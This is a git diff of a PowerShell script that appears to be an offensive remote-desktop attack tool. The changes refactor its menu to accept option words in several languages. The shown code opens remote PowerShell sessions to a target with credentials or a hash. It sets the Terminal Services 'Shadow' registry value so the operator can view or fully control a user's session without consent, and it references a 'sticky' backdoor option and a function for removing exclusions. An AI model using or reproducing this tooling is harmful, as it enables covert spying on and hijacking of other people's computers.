@@ -443,7 +443,7 @@ function Remove-Exclusions {
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-       $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
         
         if($backdoor -like '1') { $sticky = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
@@ -526,26 +526,22 @@ function Remove-Exclusions {
    $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
    $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
 
-        do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $input = "sticky" } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
-        if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine()}
-        switch -wildcard ($input) {
+        do { $seeshadow = "see", "ver", "regarder", "siehe", "vedere", "увидеть" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль" ; $stickyshadow = "sticky"
+        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $input = "sticky" } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
+        if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine()}
 
-        'ver' { $control = "false" ; Write-Host
+        if($inputoption -in $seeshadow) { $control = "false" ; Write-Host
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
         Write-Host "[+] $using:txt30" -ForegroundColor Blue }}
 
-        'see' { $control = "false" ; Write-Host
-        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
-        Write-Host "[+] $using:txt30" -ForegroundColor Blue }}
-
-        'control*' { $control = "true" ; Write-Host
+        if($inputoption -in $controlshadow) { $control = "true" ; Write-Host
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
         Write-Host "[+] $using:txt31" -ForegroundColor Blue }}
 
-        'sticky' { $control = "true" ; Write-Host
+        if($inputoption -in "$stickyshadow") { $control = "true" ; Write-Host
         Write-Host "[+] $txt34" -ForegroundColor Blue }
 
-        default { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}} until ($input -in 'ver','see','controlar','control','sticky')
+        if(!$control) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ($control)
 
     invoke-command -session $RDP[0] -scriptblock {
     $AllowAnonymousCallback = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM").AllowAnonymousCallback
